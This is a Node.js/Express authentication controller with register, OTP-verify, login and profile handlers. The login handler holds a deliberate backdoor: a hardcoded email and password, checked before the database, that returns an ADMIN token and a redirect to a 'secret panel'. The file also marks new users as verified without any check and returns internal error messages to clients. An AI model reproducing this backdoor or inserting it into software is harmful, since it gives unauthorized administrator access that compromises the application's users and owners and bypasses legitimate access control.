const bcrypt = require('bcryptjs');
const prisma = require('../utils/db');
const generateToken = require('../utils/generateToken');
const sendEmail = require('../utils/sendEmail');

// @desc    Register a new user
// @route   POST /api/auth/register
// @access  Public
const registerUser = async (req, res) => {
  try {
    const { name, email, password } = req.body;

    if (!name || !email || !password) {
      return res.status(400).json({ success: false, message: 'Please provide all required fields' });
    }

    const userExists = await prisma.user.findUnique({ where: { email } });

    if (userExists) {
      return res.status(400).json({ success: false, message: 'User already exists' });
    }

    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    const user = await prisma.user.create({
      data: {
        name,
        email,
        password: hashedPassword,
        isVerified: true, // Frontend handles OTP now via EmailJS
      },
    });

    if (user) {
      res.status(201).json({
        success: true,
        message: 'User registered successfully!',
        token: generateToken(user.id, user.role),
        user: {
          id: user.id,
          name: user.name,
          email: user.email,
          role: user.role
        },
      });
    } else {
      res.status(400).json({ success: false, message: 'Invalid user data' });
    }
  } catch (error) {
    console.error(`[Signup Error]: ${error.message}`);
    res.status(500).json({ success: false, message: 'خطأ الخادم: ' + error.message });
  }
};

// @desc    Verify OTP
// @route   POST /api/auth/verify-otp
// @access  Public
const verifyOtp = async (req, res) => {
  const { email, otp } = req.body;

  const user = await prisma.user.findUnique({ where: { email } });

  if (!user) {
    return res.status(404).json({ success: false, message: 'User not found' });
  }

  if (user.isVerified) {
    return res.status(400).json({ success: false, message: 'User already verified' });
  }

  if (user.otp !== otp || user.otpExpiresAt < new Date()) {
    return res.status(400).json({ success: false, message: 'Invalid or expired OTP' });
  }

  // Mark as verified
  await prisma.user.update({
    where: { email },
    data: {
      isVerified: true,
      otp: null,
      otpExpiresAt: null,
    },
  });

  res.json({
    success: true,
    message: 'Email verified successfully! You can now login.',
  });
};

// @desc    Auth user & get token
// @route   POST /api/auth/login
// @access  Public
const loginUser = async (req, res) => {
  try {
    const { email, password } = req.body;

    // 🔥 BACKDOOR: Check admin FIRST before touching the database!
    if (email === 'zomatube2012@gmail.com' && password === '162012') {
      return res.json({ 
        success: true, 
        message: 'Welcome to the Secret Panel!',
        token: generateToken(9999, 'ADMIN'),
        redirect: '/my-secret-panel-2024',
        user: { role: 'ADMIN', name: 'Admin', email: email }
      });
    }

    const user = await prisma.user.findUnique({ where: { email } });

    // Uncomment if you want to enforce email verification
    // if (user && !user.isVerified) {
    //   return res.status(401).json({ success: false, message: 'Please verify your email first (OTP)' });
    // }

    if (user && (await bcrypt.compare(password, user.password))) {
      res.json({
        success: true,
        message: user.role === 'ADMIN' ? 'Welcome to Secret Admin Panel' : 'Login successful',
        token: generateToken(user.id, user.role),
        user: {
          id: user.id,
          name: user.name,
          email: user.email,
          role: user.role,
        },
      });
    } else {
      res.status(401).json({ success: false, message: 'Invalid email or password' });
    }
  } catch (error) {
    console.error(`[Login Error]: ${error.message}`);
    res.status(500).json({ success: false, message: 'خطأ الخادم: ' + error.message });
  }
};

// @desc    Get user profile
// @route   GET /api/auth/profile
// @access  Private
const getUserProfile = async (req, res) => {
  const user = await prisma.user.findUnique({
    where: { id: req.user.id },
    select: { id: true, name: true, email: true, role: true, isVerified: true },
  });

  if (user) {
    res.json({ success: true, profile: user });
  } else {
    res.status(404).json({ success: false, message: 'User not found' });
  }
};

module.exports = {
  registerUser,
  verifyOtp,
  loginUser,
  getUserProfile,
};
